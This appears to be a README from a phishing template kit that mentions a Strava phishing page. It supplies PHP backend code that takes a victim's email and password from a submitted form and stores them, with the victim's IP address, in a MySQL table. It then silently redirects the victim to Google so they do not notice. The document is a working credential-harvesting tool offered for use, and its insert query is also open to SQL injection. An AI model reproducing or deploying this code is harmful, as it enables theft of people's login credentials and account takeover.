--------------------------------------------------------------------------------------------------------------------
Phishing templates.
---------------------------------------------------------------------------------------------------------------------
Strava phishing



Db connection
-------------
Create a database, modify the following text in php and add it to the files.

PHP connection:
---------------------------------------------------------------------------------------------------------------------
"<?php

$servername = "localhost";

$database = "X";

$username = "X";

$password = "X";

// creamos conexion

  $conn = mysqli_connect($servername, $username, $password, $database);
  
//si estan todos los campos rellenos los insertamos en la base de datos

  if( isset($_GET["email"]) && isset($_GET["password"]) && isset($_SERVER["REQUEST_METHOD"]) ){
  
$pass = $_GET["password"];

$mail = $_GET["email"];

 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
    }

  $insert = "insert into datos values('$mail', '$pass', '(WEB)', '$ipAddress')";

//realizamos consulta para insertar los datos

  $return = mysqli_query( $conn, $insert);
  
  print_r( ( $return));
        header("Location: https://www.google.es");
        exit();
        
}

mysqli_close( $conn);

?>"



